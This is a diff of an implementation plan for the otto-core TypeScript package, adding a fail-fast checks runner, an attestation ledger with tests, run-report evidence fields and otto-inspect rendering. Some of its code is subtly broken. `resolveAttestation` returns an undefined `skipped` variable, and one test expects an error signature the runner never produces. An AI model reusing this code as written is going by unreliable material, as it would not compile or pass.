-  return commands.map((command) => {
+  const records: ChecksRecord[] = [];
+  for (const command of commands) {
     const violations = checkCommand(policy, command);
     if (violations.length > 0) {
-      return {
+      records.push({
         command,
         exitCode: -1,
         durationMs: 0,
-        outputTail: `blocked by policy: ${violations[0].message}`,
-        failureSignature: `policy-blocked: ${command}`.slice(0, 200),
+        outputTail: violations.map((v) => v.message).join("; "),
+        failureSignature: `policy: ${violations[0].message}`.slice(0, 200),
         attestedAt: now(),
-      };
+      });
+      break; // fail-closed: never keep attesting past a policy violation
     }
-    const started = Date.now();
-    const r = run(command, cwd, timeoutMs);
-    const durationMs = Date.now() - started;
-    const exitCode = r.status ?? -1;
-    const outputTail = r.output.slice(-OUTPUT_TAIL_LIMIT);
-    return {
+    const startedAt = Date.now();
+    let status: number | null;
+    let output: string;
+    try {
+      ({ status, output } = run(command, cwd, timeoutMs));
+    } catch (e) {
+      status = -1;
+      output = e instanceof Error ? e.message : String(e);
+    }
+    const exitCode = status ?? -1;
+    const outputTail = output.slice(-OUTPUT_TAIL_LIMIT);
+    records.push({
       command,
       exitCode,
-      durationMs,
+      durationMs: Date.now() - startedAt,
       outputTail,
       failureSignature:
         exitCode === 0
           ? null
           : (extractFailureSignature(outputTail) ?? `exit ${exitCode}`),
       attestedAt: now(),
-    };
-  });
+    });
+    if (exitCode !== 0) break; // fail-fast
+  }
+  return records;
 }
 ```
 
-Export `readChecksConfig`, `runConfiguredChecks`, `CheckCommandRunner`, `DEFAULT_CHECK_TIMEOUT_MS` from `index.ts`.
+- [ ] **Step 4: Export from the package index**
 
-- [ ] **Step 4: Run test to verify it passes**
+Extend the Task 1 export block in `packages/core/src/index.ts`:
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-runner`
-Expected: PASS (7 tests).
+```ts
+export {
+  extractFailureSignature,
+  summarizeChecks,
+  readChecksConfig,
+  runConfiguredChecks,
+  type ChecksRecord,
+  type CheckCommandRunner,
+} from "./checks.js";
+```
 
-- [ ] **Step 5: Typecheck + commit**
+- [ ] **Step 5: Run the tests to verify they pass**
+
+Run: `pnpm --filter @phamvuhoang/otto-core test -- checks`
+Expected: PASS (Task 1's 9 + this task's 14).
+
+- [ ] **Step 6: Commit**
 
 ```bash
-pnpm -r typecheck
 git add packages/core/src/checks.ts packages/core/src/index.ts packages/core/src/__tests__/checks-runner.test.ts
-git commit -m "feat(p27): policy-scoped configured-checks runner on the bench exit-0 pattern"
+git commit -m "feat(p27): checks config + policy-scoped fail-fast runner"
 ```
 
 ---
 
-### Task 3: Evidence shapes — `StageRecord.checks`, `RunManifest.checksSummary`, `otto-inspect` rendering
+### Task 3: `attestation.ts` — ledger, boundary predicate, terminal resolution
 
 **Files:**
 
-- Modify: `packages/core/src/run-report.ts` (`StageRecord` at `:114-142`, `RunManifest` at `:150-191` — mirror the `inputSharpness` optional-field pattern at `:178-182`)
-- Modify: `packages/core/src/inspect.ts` (`formatRunReport` — manifest line after the sharpness block at `:76-81`; per-stage lines after the skills lines at `:96-100`)
+- Create: `packages/core/src/attestation.ts`
+- Modify: `packages/core/src/index.ts`
+- Test: `packages/core/src/__tests__/attestation.test.ts`
+
+**Interfaces:**
+
+- Consumes: `ChecksRecord`, `runConfiguredChecks`, `summarizeChecks`, `CheckCommandRunner` (Tasks 1–2); `SafetyPolicy`.
+- Produces:
+  - `export type ChecksSummary = { passed: number; failed: number; skipped: number; failureSignatures: string[]; everFailed: boolean; terminalFailed: number };`
+  - `export type AttestationLedger = { entries: { boundary: string; iteration: number; configuredCount: number; records: ChecksRecord[] }[] };` — `configuredCount` is captured at attest time so fail-fast `skipped` is exact rather than inferred.
+  - `export type AttestationContext = { commands: string[]; workspaceDir: string; policy: SafetyPolicy; timeoutMs?: number; run?: CheckCommandRunner; now?: () => string };`
+  - `export function newLedger(): AttestationLedger;`
+  - `export function shouldAttestBoundary(stageName: string): boolean;` — true for `reviewer`, `review-synth`, `apply-review-implementer`.
+  - `export function maybeAttest(ledger, stageName, isError, iteration, ctx): ChecksRecord[];` — the single seam the loop calls; returns `[]` (and appends nothing) when not a boundary, when the stage errored, or when `ctx.commands` is empty.
+  - `export function resolveAttestation(ledger): { checksSummary: ChecksSummary | null; exitReasonOverride: string | null };`
+  - `export const CHECKS_FAILED_REASON = "done with failing checks";`
+
+- [ ] **Step 1: Write the failing test**
+
+```ts
+// packages/core/src/__tests__/attestation.test.ts
+import { describe, it, expect } from "vitest";
+import {
+  newLedger,
+  shouldAttestBoundary,
+  maybeAttest,
+  resolveAttestation,
+  CHECKS_FAILED_REASON,
+  type AttestationContext,
+} from "../attestation.js";
+import { DEFAULT_POLICY } from "../safety-policy.js";
+import type { CheckCommandRunner } from "../checks.js";
+
+const ctx = (
+  commands: string[],
+  run: CheckCommandRunner
+): AttestationContext => ({
+  commands,
+  workspaceDir: "/w",
+  policy: DEFAULT_POLICY,
+  timeoutMs: 1000,
+  run,
+  now: () => "2026-07-29T00:00:00.000Z",
+});
+
+const green: CheckCommandRunner = () => ({ status: 0, output: "ok\n" });
+const red: CheckCommandRunner = () => ({ status: 1, output: "FAIL x\n" });
+
+describe("shouldAttestBoundary", () => {
+  it("is true for the three HEAD-moving review stages", () => {
+    expect(shouldAttestBoundary("reviewer")).toBe(true);
+    expect(shouldAttestBoundary("review-synth")).toBe(true);
+    expect(shouldAttestBoundary("apply-review-implementer")).toBe(true);
+  });
+
+  it("is false for read-only and implement stages", () => {
+    for (const s of [
+      "implementer",
+      "plan",
+      "verifier",
+      "structural",
+      "pr-review-lens",
+    ]) {
+      expect(shouldAttestBoundary(s)).toBe(false);
+    }
+  });
+});
+
+describe("maybeAttest", () => {
+  it("is inert with no configured commands", () => {
+    const l = newLedger();
+    expect(maybeAttest(l, "reviewer", false, 1, ctx([], green))).toEqual([]);
+    expect(l.entries).toHaveLength(0);
+  });
+
+  it("is inert for a non-boundary stage", () => {
+    const l = newLedger();
+    expect(maybeAttest(l, "implementer", false, 1, ctx(["t"], green))).toEqual(
+      []
+    );
+    expect(l.entries).toHaveLength(0);
+  });
+
+  it("is inert when the stage errored (nothing was committed)", () => {
+    const l = newLedger();
+    expect(maybeAttest(l, "reviewer", true, 1, ctx(["t"], green))).toEqual([]);
+    expect(l.entries).toHaveLength(0);
+  });
+
+  it("appends a ledger entry for a real boundary", () => {
+    const l = newLedger();
+    const records = maybeAttest(l, "reviewer", false, 2, ctx(["t"], green));
+    expect(records).toHaveLength(1);
+    expect(l.entries).toEqual([
+      { boundary: "reviewer", iteration: 2, configuredCount: 1, records },
+    ]);
+  });
+
+  it("records a thrown runner as a failure instead of throwing into the loop", () => {
+    const l = newLedger();
+    const explode = () => {
+      throw new Error("spawn EACCES");
+    };
+    const records = maybeAttest(l, "reviewer", false, 1, ctx(["t"], explode));
+    expect(records[0].exitCode).toBe(-1);
+    expect(records[0].failureSignature).toContain("attestation error");
+    expect(resolveAttestation(l).checksSummary!.terminalFailed).toBe(1);
+  });
+});
+
+describe("resolveAttestation", () => {
+  it("returns null summary when nothing was ever attested (inert run)", () => {
+    expect(resolveAttestation(newLedger())).toEqual({
+      checksSummary: null,
+      exitReasonOverride: null,
+    });
+  });
+
+  it("recovery: mid-run red then terminal green ⇒ succeeded-shaped result", () => {
+    const l = newLedger();
+    maybeAttest(l, "reviewer", false, 2, ctx(["t"], red));
+    maybeAttest(l, "reviewer", false, 5, ctx(["t"], green));
+    const { checksSummary, exitReasonOverride } = resolveAttestation(l);
+    expect(checksSummary!.terminalFailed).toBe(0); // verdict: green
+    expect(checksSummary!.everFailed).toBe(true); // churn evidence retained
+    expect(checksSummary!.failed).toBe(1); // cumulative
+    expect(checksSummary!.passed).toBe(1);
+    expect(exitReasonOverride).toBeNull();
+  });
+
+  it("terminal red drives the override", () => {
+    const l = newLedger();
+    maybeAttest(l, "reviewer", false, 1, ctx(["t"], green));
+    maybeAttest(l, "review-synth", false, 2, ctx(["t"], red));
+    const { checksSummary, exitReasonOverride } = resolveAttestation(l);
+    expect(checksSummary!.terminalFailed).toBe(1);
+    expect(checksSummary!.everFailed).toBe(true);
+    expect(exitReasonOverride).toBe(CHECKS_FAILED_REASON);
+  });
+
+  it("carries fail-fast skipped counts into the summary", () => {
+    const l = newLedger();
+    maybeAttest(l, "reviewer", false, 1, ctx(["a", "b", "c"], red));
+    expect(resolveAttestation(l).checksSummary!.skipped).toBe(2);
+  });
+});
+```
+
+- [ ] **Step 2: Run the test to verify it fails**
+
+Run: `pnpm --filter @phamvuhoang/otto-core test -- attestation`
+Expected: FAIL — `Cannot find module '../attestation.js'`.
+
+- [ ] **Step 3: Write the implementation**
+
+```ts
+// packages/core/src/attestation.ts
+/**
+ * P27 attestation orchestration.
+ *
+ * Separate from `checks.ts` because the interesting behavior here is
+ * **stateful**: which boundary attested last decides the run's verdict, while
+ * the cumulative tally is only evidence. Keeping that state in a module rather
+ * than in `loop.ts` locals is what makes it unit-testable without spawning a
+ * loop.
+ */
+import {
+  runConfiguredChecks,
+  summarizeChecks,
+  type CheckCommandRunner,
+  type ChecksRecord,
+} from "./checks.js";
+import type { SafetyPolicy } from "./safety-policy.js";
+
+/**
+ * Run-level attested-check evidence. `terminalFailed` is the verdict (spec D1);
+ * `passed`/`failed`/`failureSignatures`/`everFailed` are cumulative evidence,
+ * retained because they are the recurring-failure signal P28 consumes.
+ */
+export type ChecksSummary = {
+  passed: number;
+  failed: number;
+  skipped: number;
+  failureSignatures: string[];
+  everFailed: boolean;
+  terminalFailed: number;
+};
+
+/** Append-only log of what each boundary attested, in fire order. */
+export type AttestationLedger = {
+  entries: {
+    boundary: string;
+    iteration: number;
+    /** How many commands were configured when this boundary fired, so
+     *  fail-fast `skipped` is exact rather than inferred from the widest entry. */
+    configuredCount: number;
+    records: ChecksRecord[];
+  }[];
+};
+
+/** Everything a boundary needs to run checks; assembled once by the loop. */
+export type AttestationContext = {
+  commands: string[];
+  workspaceDir: string;
+  policy: SafetyPolicy;
+  timeoutMs?: number;
+  run?: CheckCommandRunner;
+  now?: () => string;
+};
+
+/**
+ * Exit reason for a run whose FINAL attestation was red. Phrased as a sentence
+ * to match the existing `NEXT_ACTION` keys ("done with failures", "stopped
+ * (budget)"), not as a kebab-case slug.
+ */
+export const CHECKS_FAILED_REASON = "done with failing checks";
+
+/** The three stages that move HEAD in a review path. */
+const BOUNDARIES = new Set([
+  "reviewer",
+  "review-synth",
+  "apply-review-implementer",
+]);
+
+export function newLedger(): AttestationLedger {
+  return { entries: [] };
+}
+
+export function shouldAttestBoundary(stageName: string): boolean {
+  return BOUNDARIES.has(stageName);
+}
+
+/**
+ * The single seam the loop calls from its `recordStage` closure. Inert unless
+ * this is a boundary stage that succeeded and checks are configured — an
+ * errored stage committed nothing, so there is nothing to attest.
+ */
+export function maybeAttest(
+  ledger: AttestationLedger,
+  stageName: string,
+  isError: boolean,
+  iteration: number,
+  ctx: AttestationContext
+): ChecksRecord[] {
+  if (isError) return [];
+  if (ctx.commands.length === 0) return [];
+  if (!shouldAttestBoundary(stageName)) return [];
+  let records: ChecksRecord[];
+  try {
+    records = runConfiguredChecks(
+      ctx.commands,
+      ctx.workspaceDir,
+      ctx.timeoutMs,
+      ctx.run,
+      ctx.policy,
+      ctx.now
+    );
+  } catch (e) {
+    // Fail-closed, and NEVER throw into the loop: an attestation that could not
+    // run is recorded as a failure, never as a silent green.
+    const message = e instanceof Error ? e.message : String(e);
+    records = [
+      {
+        command: ctx.commands[0],
+        exitCode: -1,
+        durationMs: 0,
+        outputTail: `attestation error: ${message}`,
+        failureSignature: `attestation error: ${message}`.slice(0, 200),
+        attestedAt: (ctx.now ?? (() => new Date().toISOString()))(),
+      },
+    ];
+  }
+  ledger.entries.push({
+    boundary: stageName,
+    iteration,
+    configuredCount: ctx.commands.length,
+    records,
+  });
+  return records;
+}
+
+/**
+ * Fold the ledger into the run-level summary and decide whether the exit reason
+ * must be overridden. The LAST entry is the terminal state: a failure a later
+ * iteration fixed must not sink the run (spec D1).
+ */
+export function resolveAttestation(ledger: AttestationLedger): {
+  checksSummary: ChecksSummary | null;
+  exitReasonOverride: string | null;
+} {
+  if (ledger.entries.length === 0) {
+    return { checksSummary: null, exitReasonOverride: null };
+  }
+  const all = ledger.entries.flatMap((e) => e.records);
+  const configuredTotal = ledger.entries.reduce(
+    (n, e) => n + e.configuredCount,
+    0
+  );
+  const cumulative = summarizeChecks(all, configuredTotal);
+
+  const last = ledger.entries[ledger.entries.length - 1];
+  const terminal = summarizeChecks(last.records, last.configuredCount);
+
+  return {
+    checksSummary: {
+      passed: cumulative.passed,
+      failed: cumulative.failed,
+      skipped,
+      failureSignatures: cumulative.failureSignatures,
+      everFailed: cumulative.failed > 0,
+      terminalFailed: terminal.failed,
+    },
+    exitReasonOverride: terminal.failed > 0 ? CHECKS_FAILED_REASON : null,
+  };
+}
+```
+
+- [ ] **Step 4: Export from the package index**
+
+```ts
+export {
+  newLedger,
+  shouldAttestBoundary,
+  maybeAttest,
+  resolveAttestation,
+  CHECKS_FAILED_REASON,
+  type AttestationLedger,
+  type AttestationContext,
+  type ChecksSummary,
+} from "./attestation.js";
+```
+
+- [ ] **Step 5: Run the tests to verify they pass**
+
+Run: `pnpm --filter @phamvuhoang/otto-core test -- attestation`
+Expected: PASS (12 tests).
+
+- [ ] **Step 6: Commit**
+
+```bash
+git add packages/core/src/attestation.ts packages/core/src/index.ts packages/core/src/__tests__/attestation.test.ts
+git commit -m "feat(p27): attestation ledger, boundary predicate, terminal resolution"
+```
+
+---
+
+### Task 4: Evidence shapes — `StageRecord.checks`, `RunManifest.checksSummary`, `otto-inspect`
+
+**Files:**
+
+- Modify: `packages/core/src/run-report.ts` (`StageRecord` at `:148`, `RunManifest` at `:225` — mirror the `inputSharpness` optional-field pattern at `:253`)
+- Modify: `packages/core/src/inspect.ts` (manifest line after the sharpness block at `:143-148`; per-stage lines after the skills block at `:163-167`)
 - Test: `packages/core/src/__tests__/checks-evidence.test.ts`
 
 **Interfaces:**
 
-- Consumes: `ChecksRecord` (Task 1); `writeStageRecord`/`readStageRecords`/`writeManifest`/`readManifest` (`run-report.ts`).
+- Consumes: `ChecksRecord` (Task 1), `ChecksSummary` (Task 3); `writeStageRecord`/`readStageRecords`/`writeManifest`/`readManifest` (`run-report.ts`).
 - Produces:
-  - `StageRecord.checks?: ChecksRecord[];` — absent = no checks configured or no attestation boundary fired for this stage.
-  - `RunManifest.checksSummary?: { passed: number; failed: number; failureSignatures: string[] };` — absent for every run that never attested.
-  - `formatRunReport` renders `  checks:      N passed, M failed (harness-attested)` on the manifest header and `      check: PASS|FAIL \`cmd\` (exit N, Tms)` lines under each stage row carrying records.
+  - `StageRecord.checks?: ChecksRecord[];` — absent = no checks configured or no boundary fired for this stage.
+  - `RunManifest.checksSummary?: ChecksSummary;` — absent for every run that never attested.
+  - `formatRunReport` renders `  checks:      N passed, M failed, K skipped (harness-attested)` on the manifest header and `      check: PASS|FAIL <cmd> (exit N, Tms)` under each stage carrying records.
 
 - [ ] **Step 1: Write the failing test**
 
@@ -553,950 +1013,998 @@ const CHECK: ChecksRecord = {
   durationMs: 8123,
   outputTail: "FAIL src/b.test.ts > adds\n",
   failureSignature: "FAIL src/b.test.ts > adds",
-  attestedAt: "2026-07-10T00:01:00.000Z",
+  attestedAt: "2026-07-29T00:01:00.000Z",
 };
 
 const stage = (over: Partial<StageRecord>): StageRecord => ({
   iteration: 1,
   stage: "reviewer",
   runtimeId: "claude",
-  costUsd: 0.5,
+  costUsd: 0.1,
   usage: emptyTokenUsage(),
   isError: false,
   apiErrorStatus: null,
-  startedAt: "2026-07-10T00:00:00.000Z",
-  finishedAt: "2026-07-10T00:02:00.000Z",
+  startedAt: "2026-07-29T00:00:00.000Z",
+  finishedAt: "2026-07-29T00:01:00.000Z",
   ...over,
 });
 
-const manifest = (over: Partial<RunManifest>): RunManifest => ({
-  runId: "r1",
-  bin: "otto-afk",
-  mode: "afk",
-  inputs: "plan.md",
-  runtime: { id: "claude", displayName: "Claude Code" },
-  iterations: 1,
-  costUsd: 0.5,
-  tokenUsage: emptyTokenUsage(),
-  artifacts: [],
-  startedAt: "2026-07-10T00:00:00.000Z",
-  ...over,
-});
+const manifest = (over: Partial<RunManifest>): RunManifest =>
+  ({
+    runId: "r1",
+    bin: "otto-ghafk",
+    mode: "ghafk",
+    inputs: "",
+    runtime: { id: "claude", displayName: "Claude Code" },
+    iterations: 1,
+    costUsd: 0.1,
+    tokenUsage: emptyTokenUsage(),
+    artifacts: [],
+    startedAt: "2026-07-29T00:00:00.000Z",
+    finishedAt: "2026-07-29T00:02:00.000Z",
+    ...over,
+  }) as RunManifest;
 
 describe("checks evidence round-trip", () => {
-  it("StageRecord.checks and RunManifest.checksSummary survive write/read", () => {
-    const ws = mkdtempSync(join(tmpdir(), "otto-evidence-"));
-    writeStageRecord(ws, "r1", 0, stage({ checks: [CHECK] }));
-    writeManifest(
-      ws,
-      manifest({
-        checksSummary: {
-          passed: 0,
-          failed: 1,
-          failureSignatures: ["FAIL src/b.test.ts > adds"],
-        },
-      })
-    );
-    expect(readStageRecords(ws, "r1")[0].checks).toEqual([CHECK]);
-    expect(readManifest(ws, "r1")?.checksSummary).toEqual({
-      passed: 0,
+  it("persists StageRecord.checks", () => {
+    const dir = mkdtempSync(join(tmpdir(), "otto-ev-"));
+    writeStageRecord(dir, "r1", 0, stage({ checks: [CHECK] }));
+    expect(readStageRecords(dir, "r1")[0].checks).toEqual([CHECK]);
+  });
+
+  it("persists RunManifest.checksSummary", () => {
+    const dir = mkdtempSync(join(tmpdir(), "otto-ev-"));
+    const summary = {
+      passed: 1,
       failed: 1,
+      skipped: 1,
       failureSignatures: ["FAIL src/b.test.ts > adds"],
-    });
+      everFailed: true,
+      terminalFailed: 1,
+    };
+    writeManifest(dir, "r1", manifest({ checksSummary: summary }));
+    expect(readManifest(dir, "r1")!.checksSummary).toEqual(summary);
+  });
+
+  it("omits both fields on an inert run", () => {
+    const dir = mkdtempSync(join(tmpdir(), "otto-ev-"));
+    writeStageRecord(dir, "r1", 0, stage({}));
+    writeManifest(dir, "r1", manifest({}));
+    expect(readStageRecords(dir, "r1")[0].checks).toBeUndefined();
+    expect(readManifest(dir, "r1")!.checksSummary).toBeUndefined();
   });
 });
 
-describe("formatRunReport rendering", () => {
-  it("renders the manifest summary and per-stage attested check lines", () => {
+describe("formatRunReport renders attested checks", () => {
+  it("renders the manifest tally and the per-stage lines", () => {
     const out = formatRunReport(
       manifest({
-        checksSummary: { passed: 1, failed: 1, failureSignatures: ["exit 1"] },
+        checksSummary: {
+          passed: 1,
+          failed: 1,
+          skipped: 1,
+          failureSignatures: ["FAIL src/b.test.ts > adds"],
+          everFailed: true,
+          terminalFailed: 1,
+        },
       }),
       [stage({ checks: [CHECK] })]
     );
-    expect(out).toContain("checks:      1 passed, 1 failed (harness-attested)");
+    expect(out).toContain("1 passed, 1 failed, 1 skipped (harness-attested)");
     expect(out).toContain("check: FAIL `pnpm -r test` (exit 1, 8123ms)");
-    expect(out).toContain("FAIL src/b.test.ts > adds");
   });
-  it("renders byte-identically to today when no checks evidence exists", () => {
-    const m = manifest({});
-    const s = [stage({})];
-    const out = formatRunReport(m, s);
-    expect(out).not.toContain("checks:");
+
+  it("renders nothing extra for an inert run", () => {
+    const out = formatRunReport(manifest({}), [stage({})]);
+    expect(out).not.toContain("harness-attested");
     expect(out).not.toContain("check:");
   });
 });
 ```
 
-- [ ] **Step 2: Run test to verify it fails**
+- [ ] **Step 2: Run the test to verify it fails**
 
 Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-evidence`
-Expected: FAIL — typecheck error: `checks` / `checksSummary` do not exist on `StageRecord` / `RunManifest`.
+Expected: FAIL — `checks` / `checksSummary` are not properties of the types (typecheck), and the render assertions miss.
 
-- [ ] **Step 3: Add the fields + rendering**
+- [ ] **Step 3: Add the fields**
 
-In `run-report.ts`, `import type { ChecksRecord } from "./checks.js";` and add:
+In `packages/core/src/run-report.ts`, inside `StageRecord` (`:148`), beside the other optional evidence fields:
 
 ```ts
-// in StageRecord, after `reviewSeverity`:
-  /** Harness-attested check results run after this stage's fix commit (P27);
-   *  absent = no `checks` config or no attestation boundary fired. */
+  /** Harness-attested check results for a boundary stage (P27, issue #246);
+   *  absent = no checks configured or this stage is not an attestation
+   *  boundary. Set by the loop only — never parsed from agent JSON. */
   checks?: ChecksRecord[];
-
-// in RunManifest, after `inputSharpness`:
-  /** Aggregate of the run's harness-attested checks (P27); absent when no
-   *  `checks` config is present or no attestation boundary fired. */
-  checksSummary?: {
-    passed: number;
-    failed: number;
-    failureSignatures: string[];
-  };
 ```
 
-In `inspect.ts` `formatRunReport`, after the `inputSharpness` block (`:76-81`):
+Inside `RunManifest` (`:225`), beside `inputSharpness` (`:253`):
+
+```ts
+  /** Run-level attested-check evidence (P27, issue #246); absent when the run
+   *  never attested. `terminalFailed` is the verdict; the cumulative fields are
+   *  churn evidence for P28. */
+  checksSummary?: ChecksSummary;
+```
+
+Add the imports at the top of `run-report.ts`:
+
+```ts
+import type { ChecksRecord } from "./checks.js";
+import type { ChecksSummary } from "./attestation.js";
+```
+
+- [ ] **Step 4: Render them in `otto-inspect`**
+
+In `packages/core/src/inspect.ts`, immediately after the `inputSharpness` block (`:143-148`):
 
 ```ts
 if (manifest.checksSummary) {
-  const cs = manifest.checksSummary;
-  const sigs =
-    cs.failureSignatures.length > 0
-      ? ` — ${cs.failureSignatures.join("; ")}`
-      : "";
+  const c = manifest.checksSummary;
   lines.push(
-    `  checks:      ${cs.passed} passed, ${cs.failed} failed (harness-attested)${sigs}`
+    `  checks:      ${c.passed} passed, ${c.failed} failed, ${c.skipped} skipped (harness-attested)`
   );
+  if (c.terminalFailed > 0) {
+    lines.push(
+      `               FINAL STATE RED — ${c.failureSignatures[0] ?? "see stage records"}`
+    );
+  } else if (c.everFailed) {
+    lines.push(`               (recovered — earlier iterations were red)`);
+  }
 }
 ```
 
-and inside the stage loop, after the skills lines (`:96-100`):
+And inside the `stages.forEach` callback, immediately after the `skillsUsed` block (`:163-167`):
 
 ```ts
 if (s.checks && s.checks.length > 0) {
   for (const c of s.checks) {
-    const sig = c.failureSignature ? ` — ${c.failureSignature}` : "";
     lines.push(
-      `      check: ${c.exitCode === 0 ? "PASS" : "FAIL"} \`${c.command}\` (exit ${c.exitCode}, ${c.durationMs}ms)${sig}`
+      `      check: ${c.exitCode === 0 ? "PASS" : "FAIL"} \`${c.command}\` (exit ${c.exitCode}, ${c.durationMs}ms)`
     );
   }
 }
 ```
 
-- [ ] **Step 4: Run test to verify it passes**
+- [ ] **Step 5: Run the tests to verify they pass**
 
 Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-evidence`
-Expected: PASS (3 tests).
+Expected: PASS (5 tests).
 
-- [ ] **Step 5: Typecheck + commit**
+- [ ] **Step 6: Commit**
 
 ```bash
-pnpm -r typecheck
 git add packages/core/src/run-report.ts packages/core/src/inspect.ts packages/core/src/__tests__/checks-evidence.test.ts
-git commit -m "feat(p27): checks evidence on stage records, manifest, and otto-inspect"
+git commit -m "feat(p27): stage/manifest checks evidence + otto-inspect rendering"
 ```
 
 ---
 
-### Task 4: Attest at the review boundary — `shouldAttestChecks` + loop/panel wiring
+### Task 5: Attest at the review boundary (loop wiring)
 
 **Files:**
 
-- Modify: `packages/core/src/checks.ts` (add `shouldAttestChecks`)
-- Modify: `packages/core/src/loop.ts` (config read + `attestFixCommit` closure near the compressor setup at `:512-547`; `recordStage` closure gains a `checks` param at `:561-606`; pre-stage HEAD snapshot + post-stage attestation around `:1294`/`:1445`; `checksSummary` on both finalize manifest writes at `:836-907`)
-- Modify: `packages/core/src/panel.ts` (`RunPanelOptions.attestChecks` + `recordStage` 5th param at `:177-183`; fire post-synth iff `committed` at `:399-421`)
-- Modify: `packages/core/src/index.ts` (export `shouldAttestChecks`)
-- Test: `packages/core/src/__tests__/checks-boundary.test.ts`
+- Modify: `packages/core/src/loop.ts` (`recordStage` closure at `:775-820`; ledger + context construction near the run-id/manifest setup)
+- Test: `packages/core/src/__tests__/attestation-wiring.test.ts`
 
 **Interfaces:**
 
-- Consumes: `readChecksConfig`, `runConfiguredChecks`, `summarizeChecks`, `ChecksRecord` (Tasks 1–2); `headSha` (`git.ts:44`); `readSafetyPolicy` (already imported in `loop.ts`).
-- Produces:
-  - `export function shouldAttestChecks(opts: { stageName: string; checksConfigured: boolean; headBefore: string | null; headAfter: string | null }): boolean;` — true iff checks are configured, the stage is `reviewer` or `apply-review-implementer` (the two review-path fix-commit stages; panel synth attests via the callback), and HEAD moved. Pure.
-  - `RunPanelOptions.attestChecks?: () => ChecksRecord[];` and panel `recordStage` gains `checks?: ChecksRecord[]` as a 5th param.
-  - Loop `recordStage` closure signature: `(recIteration, stageName, sr, startedAt, reviewSeverity?, checks?)`, spread into the record like `reviewSeverity` (`loop.ts:595-597`).
+- Consumes: `newLedger`, `maybeAttest`, `AttestationContext` (Task 3); `readChecksConfig` (Task 2); `StageRecord.checks` (Task 4).
+- Produces: no new exports. `recordStage` attaches `checks` to the record it writes, for `reviewer` (direct chain) and `review-synth` (via `panel.ts`, which already calls this same closure — **no panel change needed**).
+
+**Why this seam:** `panel.ts`'s `recordStage?: (stageName, sr, startedAt, reviewSeverity?) => void` hook (`panel.ts:175-189`) is the loop's own closure. Hooking attestation there covers the single reviewer and the panel synth with one wiring point.
 
 - [ ] **Step 1: Write the failing test**
 
+This test exercises the wiring contract without booting a loop: a `recordStage`-shaped function built from the same pieces.
+
 ```ts
-// packages/core/src/__tests__/checks-boundary.test.ts
+// packages/core/src/__tests__/attestation-wiring.test.ts
 import { describe, it, expect } from "vitest";
-import { shouldAttestChecks } from "../checks.js";
+import {
+  newLedger,
+  maybeAttest,
+  resolveAttestation,
+  type AttestationContext,
+} from "../attestation.js";
+import { DEFAULT_POLICY } from "../safety-policy.js";
+import type { CheckCommandRunner } from "../checks.js";
+import type { ChecksRecord } from "../checks.js";
 
-const base = {
-  stageName: "reviewer",
-  checksConfigured: true,
-  headBefore: "aaa111",
-  headAfter: "bbb222",
-};
+/** Mirror of the loop's recordStage attestation seam. */
+function recordStageLike(
+  ledger: ReturnType<typeof newLedger>,
+  ctx: AttestationContext,
+  stageName: string,
+  isError: boolean,
+  iteration: number
+): { stage: string; checks?: ChecksRecord[] } {
+  const checks = maybeAttest(ledger, stageName, isError, iteration, ctx);
+  return { stage: stageName, ...(checks.length > 0 ? { checks } : {}) };
+}
 
-describe("shouldAttestChecks", () => {
-  it("fires after a reviewer fix commit (HEAD moved)", () => {
-    expect(shouldAttestChecks(base)).toBe(true);
+const ctx = (
+  commands: string[],
+  run: CheckCommandRunner
+): AttestationContext => ({
+  commands,
+  workspaceDir: "/w",
+  policy: DEFAULT_POLICY,
+  timeoutMs: 1000,
+  run,
+  now: () => "2026-07-29T00:00:00.000Z",
+});
+
+const green: CheckCommandRunner = () => ({ status: 0, output: "ok\n" });
+const red: CheckCommandRunner = () => ({ status: 1, output: "FAIL x\n" });
+
+describe("recordStage attestation seam", () => {
+  it("attaches checks to a reviewer record", () => {
+    const l = newLedger();
+    const rec = recordStageLike(l, ctx(["t"], green), "reviewer", false, 1);
+    expect(rec.checks).toHaveLength(1);
+    expect(rec.checks![0].exitCode).toBe(0);
   });
-  it("fires after an apply-review-implementer commit", () => {
+
+  it("attaches checks to a panel synth record (same closure)", () => {
+    const l = newLedger();
+    const rec = recordStageLike(l, ctx(["t"], red), "review-synth", false, 1);
+    expect(rec.checks![0].exitCode).toBe(1);
+  });
+
+  it("leaves implementer and lens records untouched", () => {
+    const l = newLedger();
     expect(
-      shouldAttestChecks({ ...base, stageName: "apply-review-implementer" })
-    ).toBe(true);
+      recordStageLike(l, ctx(["t"], green), "implementer", false, 1).checks
+    ).toBeUndefined();
+    expect(
+      recordStageLike(l, ctx(["t"], green), "structural", false, 1).checks
+    ).toBeUndefined();
+    expect(l.entries).toHaveLength(0);
   });
-  it("never fires without a checks config (the inertness guarantee)", () => {
-    expect(shouldAttestChecks({ ...base, checksConfigured: false })).toBe(
-      false
-    );
+
+  it("is inert end-to-end with no checks configured", () => {
+    const l = newLedger();
+    const rec = recordStageLike(l, ctx([], green), "reviewer", false, 1);
+    expect(rec.checks).toBeUndefined();
+    expect(resolveAttestation(l).checksSummary).toBeNull();
   });
-  it("never fires when HEAD did not move (review OK, no fix commit)", () => {
-    expect(shouldAttestChecks({ ...base, headAfter: "aaa111" })).toBe(false);
-  });
-  it("never fires on non-review stages (implementer/plan/verifier)", () => {
-    for (const stageName of [
-      "implementer",
-      "plan",
-      "verifier",
-      "journal-write",
-    ]) {
-      expect(shouldAttestChecks({ ...base, stageName })).toBe(false);
-    }
-  });
-  it("never fires when HEAD is unknown (no git repo)", () => {
-    expect(shouldAttestChecks({ ...base, headBefore: null })).toBe(false);
-    expect(shouldAttestChecks({ ...base, headAfter: null })).toBe(false);
+
+  it("a multi-iteration run resolves on the terminal boundary", () => {
+    const l = newLedger();
+    recordStageLike(l, ctx(["t"], red), "reviewer", false, 2);
+    recordStageLike(l, ctx(["t"], green), "reviewer", false, 5);
+    const { checksSummary } = resolveAttestation(l);
+    expect(checksSummary!.terminalFailed).toBe(0);
+    expect(checksSummary!.everFailed).toBe(true);
   });
 });
 ```
 
-- [ ] **Step 2: Run test to verify it fails**
+- [ ] **Step 2: Run the test to verify it fails**
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-boundary`
-Expected: FAIL — `shouldAttestChecks` not exported.
+Run: `pnpm --filter @phamvuhoang/otto-core test -- attestation-wiring`
